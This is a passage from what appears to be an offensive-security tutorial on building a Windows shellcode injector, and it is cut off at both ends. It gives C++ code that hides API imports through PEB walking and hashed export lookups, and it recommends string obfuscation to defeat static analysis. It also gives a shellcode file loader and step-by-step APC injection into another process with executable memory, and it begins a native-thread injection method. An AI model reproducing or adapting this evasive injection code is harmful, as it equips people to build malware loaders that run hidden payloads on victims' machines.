hNtdll = GetModuleBaseFromPEB(L&quot;ntdll.dll&quot;); // Need wstring comparison helper\n    HMODULE hKernel32 = GetModuleBaseFromPEB(L&quot;kernel32.dll&quot;);\n\n    if (!hNtdll || !hKernel32) {\n        // Handle error: Could not find essential modules\n        std::cerr &lt;&lt; &quot;[-] Failed to find essential modules via PEB.\\n&quot;;\n        return FALSE;\n    }\n\n    // Step 2: Resolve necessary APIs using EAT traversal (from Module 6/7)\n    // Adapt your GetProcAddressByHash function to take HMODULE and hash\n    // Example: FARPROC GetProcAddressByHash(HMODULE hModule, DWORD functionHash);\n\n    // Resolve kernel32.dll APIs\n    g_ResolvedAPIs.pOpenProcess = GetProcAddressByHash(hKernel32, HashString(&quot;OpenProcess&quot;)); // Need your hashing function\n    g_ResolvedAPIs.pVirtualAllocEx = GetProcAddressByHash(hKernel32, HashString(&quot;VirtualAllocEx&quot;));\n    g_ResolvedAPIs.pWriteProcessMemory = GetProcAddressByHash(hKernel32, HashString(&quot;WriteProcessMemory&quot;));\n    g_ResolvedAPIs.pCloseHandle = GetProcAddressByHash(hKernel32, HashString(&quot;CloseHandle&quot;));\n    g_ResolvedAPIs.pGetLastError = GetProcAddressByHash(hKernel32, HashString(&quot;GetLastError&quot;));\n\n    // Resolve ntdll.dll APIs\n    g_ResolvedAPIs.pNtOpenProcess = GetProcAddressByHash(hNtdll, HashString(&quot;NtOpenProcess&quot;));\n    g_ResolvedAPIs.pNtAllocateVirtualMemory = GetProcAddressByHash(hNtdll, HashString(&quot;NtAllocateVirtualMemory&quot;));\n    g_ResolvedAPIs.pNtWriteVirtualMemory = GetProcAddressByHash(hNtdll, HashString(&quot;NtWriteVirtualMemory&quot;));\n    g_ResolvedAPIs.pNtCreateThreadEx = GetProcAddressByHash(hNtdll, HashString(&quot;NtCreateThreadEx&quot;));\n    g_ResolvedAPIs.pNtQueueApcThread = GetProcAddressByHash(hNtdll, HashString(&quot;NtQueueApcThread&quot;));\n    g_ResolvedAPIs.pNtClose = GetProcAddressByHash(hNtdll, HashString(&quot;NtClose&quot;));\n    // Resolve other ntdll functions if needed for specific techniques (e.g., NtGetNextThread for APC target)\n\n    // Step 3: Check if ALL required APIs were resolved\n    // This is crucial! Add checks for every pointer you need.\n    if (!g_ResolvedAPIs.pOpenProcess || !g_ResolvedAPIs.pVirtualAllocEx || /* ... other checks ... */) {\n         std::cerr &lt;&lt; &quot;[-] Failed to resolve one or more required APIs.\\n&quot;;\n         // You might print which ones failed based on individual checks\n         return FALSE;\n    }\n\n    std::cout &lt;&lt; &quot;[+] Successfully resolved all required APIs.\\n&quot;;\n    return TRUE;\n}\n\n// Helper function to call GetLastError using the resolved pointer\nDWORD GetLastErrorResolved() {\n    if (g_ResolvedAPIs.pGetLastError) {\n        // Cast the FARPROC to the function pointer type and call it\n        typedef DWORD (WINAPI* GetLastErrorFn)();\n        GetLastErrorFn pfnGetLastError = (GetLastErrorFn)g_ResolvedAPIs.pGetLastError;\n        return pfnGetLastError();\n    }\n    return 0; // Default or error value if resolver failed\n}\n\n// Example macro for calling resolved APIs safely\n#define CALL_RESOLVED_API(api_ptr, ...) \\\n    (((decltype(&amp;api_ptr))api_ptr)(__VA_ARGS__))\n\n// Example usage:\n// HANDLE hProc = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, ...);\n// DWORD err = GetLastErrorResolved();\n// NTSTATUS status = CALL_RESOLVED_API(g_ResolvedAPIs.pNtAllocateVirtualMemory, ...);\n</code></pre>\n</li>\n<li><p><strong>String Obfuscation (Module 7):</strong> Instead of using literal strings <code>&quot;OpenProcess&quot;</code>, <code>&quot;ntdll.dll&quot;</code>, etc., calculate their hashes <em>at compile time</em> (if your hashing function allows <code>constexpr</code>) or obfuscate the strings and deobfuscate them <em>at runtime</em> just before calculating the hash for the EAT lookup. This makes static analysis harder.</p>\n</li>\n</ul>\n<p><strong>Step 4: Reading Shellcode from File</strong></p>\n<p>Standard file I/O. Read the entire content of the shellcode file into a <code>std::vector&lt;BYTE&gt;</code> or <code>BYTE*</code> buffer.</p>\n<ul>\n<li><p><strong>Code Snippet:</strong></p>\n<pre><code class=\"language-c++\">#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\n// Function to read shellcode from a file\nstd::vector&lt;BYTE&gt; ReadShellcodeFile(const std::string&amp; filePath) {\n    std::ifstream file(filePath, std::ios::binary | std::ios::ate);\n    if (!file.is_open()) {\n        std::cerr &lt;&lt; &quot;[-] Failed to open shellcode file: &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n        return {}; // Return empty vector on failure\n    }\n\n    std::streamsize fileSize = file.tellg();\n    file.seekg(0, std::ios::beg);\n\n    std::vector&lt;BYTE&gt; buffer(fileSize);\n    if (!file.read(reinterpret_cast&lt;char*&gt;(buffer.data()), fileSize)) {\n        std::cerr &lt;&lt; &quot;[-] Failed to read shellcode file: &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n        return {};\n    }\n\n    std::cout &lt;&lt; &quot;[+] Read &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes of shellcode from &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n    return buffer;\n}\n</code></pre>\n</li>\n</ul>\n<p><strong>Step 5: Implementing Injection Method 1 (e.g., APC)</strong></p>\n<p>This function will encapsulate the APC injection logic from Module 2, but using the dynamically resolved APIs stored in <code>g_ResolvedAPIs</code>.</p>\n<ul>\n<li><p><strong>Function Signature:</strong> <code>BOOL ExecuteInjectionAPC(DWORD targetPid, const std::vector&lt;BYTE&gt;&amp; shellcode)</code></p>\n</li>\n<li><p><strong>Steps (using resolved APIs):</strong></p>\n<ol>\n<li>Get a handle to the target process: <code>HANDLE hProcess = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, PROCESS_ALL_ACCESS, FALSE, targetPid);</code> (Or use <code>pNtOpenProcess</code>). Check handle validity.</li>\n<li>Allocate memory in the target process: <code>LPVOID remoteBuffer = CALL_RESOLVED_API(g_ResolvedAPIs.pVirtualAllocEx, hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</code> (Or use <code>pNtAllocateVirtualMemory</code>). Check allocated address.</li>\n<li>Write shellcode to the allocated memory: <code>BOOL writeSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pWriteProcessMemory, hProcess, remoteBuffer, shellcode.data(), shellcode.size(), NULL);</code> (Or use <code>pNtWriteVirtualMemory</code>). Check success.</li>\n<li>Find a suitable thread in the target process. This is slightly tricky without static imports like <code>CreateToolhelp32Snapshot</code>. You might need to resolve <code>CreateToolhelp32Snapshot</code>, <code>Thread32First</code>, <code>Thread32Next</code> dynamically as well, or rely on <code>NtGetNextThread</code> if you resolved it (less common). A simpler approach for a POC might be to target the main thread (often the first one enumerated or thread ID != PID).</li>\n<li>Get a handle to the target thread: <code>HANDLE hThread = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenThread, THREAD_ALL_ACCESS, FALSE, targetThreadId);</code> (Need <code>pOpenThread</code> resolved, or use <code>NtOpenThread</code>). Check handle validity.</li>\n<li>Queue the APC: <code>DWORD queueSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pQueueUserAPC, (PAPCFUNC)remoteBuffer, hThread, NULL);</code> (Need <code>pQueueUserAPC</code> resolved, or use <code>pNtQueueApcThread</code> which is <code>NTSTATUS</code> based). Check success.</li>\n<li>Close handles: <code>CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hThread); CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hProcess);</code> (Or <code>pNtClose</code>).</li>\n</ol>\n</li>\n<li><p><strong>Error Checking:</strong> After <em>every</em> API call, check the return value. If it indicates failure, print an error message (including <code>GetLastErrorResolved()</code>) and return <code>FALSE</code>.</p>\n</li>\n</ul>\n<p><strong>Step 6: Implementing Injection Method 2 (e.g., Native Thread)</strong></p>\n<p>This function will encapsulate the <code>NtCreateThreadEx</code> injection logic from Module 3, using dynamically resolved APIs.</p>\n<ul>\n<li><strong>Function Signature:</strong> <code>BOOL ExecuteInjectionNativeThread(DWORD targetPid, const std::vector&lt;BYTE&gt;&amp; shellcode)</code></li>\n<li>**Steps (using</li>\n</ul>\n\n                </div>\n             </div>\n         "
